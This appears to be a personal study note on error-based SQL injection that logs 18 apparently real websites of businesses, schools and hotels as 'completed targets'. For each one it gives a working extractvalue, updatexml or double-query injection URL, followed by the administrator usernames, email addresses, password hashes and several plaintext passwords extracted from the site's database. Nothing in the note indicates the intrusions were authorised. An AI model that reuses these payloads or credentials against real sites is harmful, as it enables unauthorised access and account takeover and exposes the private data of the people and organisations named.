# <mark style="background: #FF5582A6;">Prerequisite :</mark> 

Knowing How To Work With Burp Suite 
[[12-Xpath Injection]]
[[13-Double Query]]

# <mark style="background: #FFB86CA6;">Completed Targets : </mark> 

1. https://www.maapet.com/gallery-list.php?id=-15%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(password)%20from%20admin_login%20limit%200,1)))--+

	username : YWRtaW4=
	password : YWRtaW4=

2. http://hiriketiyabeach.lk/room-view.php?id=1%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(username)%20from%20user%20limit%200,1)))--

	username : hiriketiyabeach
	password 1 : 601433d72242a66e0f149accba46
	password 2 :             d72242a66e0f149accba46737b
	final password : 601433d72242a66e0f149accba46737b

3. http://firoozgar.behkima.ir/lms/view.php?id=22590%27%20and%20updatexml(null,concat(0x3a,(select%20concat(user_email)%20from%20ap_users%20limit%200,1)),null)--+

	user_email : arash.zolfagharinia@gmail.com
	user_password 1 : $2a$08$mGJsSmkUHjflguLP5uWijOPX
	user_password 2 :     a$08$mGJsSmkUHjflguLP5uWijOPXv6e
	final password : $2a$08$mGJsSmkUHjflguLP5uWijOPXv6e

4. https://www.pharmacongignos.in/product.php?id=9%20&%20cat_id=%203%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(admin_name)%20from%20administrators%20limit%200,1)))--+

	username : pharmalogin@123
	password 1 : 0d529000f68996e4adc14845822e...
	password 2 :   d529000f68996e4adc14845822ef0af
	final password : 0d529000f68996e4adc14845822ef0af

5. https://www.pbw-india.com/category.php?id=2%20and%20/*!12345extractvalue(rand(),CONCAT(0x7e,(select%20CONCAT(user_email)%20from/**/user_info%20limit%200,1)))*/--

	useremail : patelbrass@pbw-india.com
	password : pbw@admin123#

6. https://www.jasmineexports.com/category.php?catid=2%20and%20extractvalue(rand(),concat(0x7e,(select%20column_name%20from%20information_schema.columns%20where%20table_name=%27tbladmin%27%20limit%202,1)))--

	(it didin't have a column for the name of the user, but it had the loginid column)

	loginid : admin
	password : ganesh@6688*

7. https://www.htps.edu.hk/en/school.php?id=19%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(usr_name)%20from%20usr%20limit%200,1)))--+

	username : Administrator
	password 1 : 7b6e38268b9d17545ecab0995c6238e
	password 2 :   b6e38268b9d17545ecab0995c6238eb8
	
	(with [[12-Xpath Injection]], the password isn't complete) ---> [[13-Double Query]]

	final password (with double) : 7b6e38268b9d17545ecab0995c6238eb8f61cfd3

	- (https://www.htps.edu.hk/en/school.php?id=19%27%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(usr_pwd)%20as%20char),0x7e))%20from%20holytrinity.usr%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+)

8. https://www.lkh.com.sg/news.php?id=3%20and%20updatexml(null,concat(0x3a,(select%20concat(user_name)%20from%20user%20limit%200,1)),null)--

	user_name : lkhcomsg_admin
	user_password 1 : ef72c7414ce60334e34f8bc6706e540
	user_password 2 : 

	(when we delete the 0x3a to show the password as complete, the site loaded without any error and it doesn't have [[13-Double Query]])

9. https://acebaypointe.com/post.php?id=28%20and%20/*!12345extractvalue(rand(),CONCAT(0x7e,(select%20CONCAT(username)%20from/**/tbl_user%20limit%200,1)))*/--

	username : admin
	password 1 : 748a75a6efc25e40221d40e4eabf0e3
	password 2 :       a75a6efc25e40221d40e4eabf0e3c
	final password : 748a75a6efc25e40221d40e4eabf0e3c

10. http://sinchung.com.my/tour.php?id=26%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(username)%20from%20control_login%20limit%200,1)))--+

	username : admin
	password 1 : 5f4dcc3b5aa765d61d8327deb882cf9
	password 2 :   f4dcc3b5aa765d61d8327deb882cf99
	final password : 5f4dcc3b5aa765d61d8327deb882cf99

11. http://www.saleemcarpets.com/prod_detail.php?ID=10%27%20and%20/*!12345extractvalue(rand(),CONCAT(0x7e,(select%20CONCAT(username)%20from/**/user%20limit%200,1)))*/--+

	username : adminme
	password 1 : b7feb6077ec63d8caa449362b23d246
	password 2 :

	<mark style="background: #FF5582A6;">Point :</mark> 
	when we delete the 0x7e to show the password as complete, the site loaded without any error)
	(it doesn't have [[13-Double Query]], only the combined way with
	[[2-Sql Injection (Basic)]] may work, in this way, we have found the name of the important table and the important columns, so we extract the information we want as follow :
	- <mark style="background: #FFB86CA6;">union select 1,2,3,4,5,password,7,8,9 from admin--</mark> 

12. http://stpbusiness.st/single.php?id_p=30%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(email)%20from%20usuario%20limit%200,1)))--+

	email : odinilsongomes4@gmail.com
	password 1 : adcd7048512e64b48da55b027577886
	password 2 :
	
	(when we delete the 0x7e to show the password as complete, the site loaded without any error) ---> [[13-Double Query]]

	final password (with double) : adcd7048512e64b48da55b027577886ee5a36350

	- http://stpbusiness.st/single.php?id_p=30%27%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(senha)%20as%20char),0x7e))%20from%20stpbusiness.usuario%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+

13. https://www.satoribike.com/pro.php?m=d&pid=80&cid=15&f=14%27%20and%20/*!12345extractvalue(rand(),CONCAT(0x7e,(select%20CONCAT(username)%20from/**/managers_eng%20limit%200,1)))*/--+

	username : root
	password : satori4390

14. http://artworkshop.co.uk/newsdetail.php?NewsID=160%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(Email)%20from%20members%20limit%200,1)))--

	email : bigmetalfish@gmail.com
	password 1 : e1a812d25dc400cff7b81cccd9ae...
	password 2 :

	(when we delete the 0x7e to show the password as complete, the site loaded without any error) ---> [[13-Double Query]]

	final password (with double) : e1a812d25dc400cff7b81cccd9aedebf45a84eda

	- http://artworkshop.co.uk/newsdetail.php?NewsID=160%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(password)%20as%20char),0x7e))%20from%20kdyrsxni_db1.members%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--

15. https://www.promare.be/shop.php?id=1%27%20and%20updatexml(null,concat(0x3a,(select%20concat(password)%20from%20%20tbl_login%20limit%200,1)),null)--+

	username : Pr0mare
	password 1 : 3caf205e08fdd567596f664bf5a587e
	password 2 :   caf205e08fdd567596f664bf5a587e8
	final password : 3caf205e08fdd567596f664bf5a587e8

16. http://www.embryohotel.com/room-detail.php?id=1%20And(select%201%20from(select%20count(*),concat(0x3a,(select%20substr(group_concat(username,0x3a,password),1,150)%20from%20admin%20where%20table_schema%20like%20database()),0x3a,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)z)--%20-
	
	username : admin
	password 1 (with double) : e742c63f03ab602f2b38433ffc28b5145ba1332d

17. http://www.altcine.com/movie.php?id=-1940%27and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(password)%20as%20char),0x7e))%20from%20altcine_mems.users%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+

	email : webmaster@altcine.com
	password (with double) : a978acc8a7ae15f49f58f3495f0d85ba

18. http://www.marywardlubhu.edu.np/school.php?id=168&cat_id=23%27%20and%20extractvalue(rand(),concat((select%20concat(username)%20from%20tbl_admin%20limit%200,1)))--+

	username : #&*5$#ExQ!-+
	password 1 : 20e041a68eefa994cc7dd29bc2235dc
	password 2 :     e041a68eefa994cc7dd29bc2235dc0
	final password : 20e041a68eefa994cc7dd29bc2235dc0
	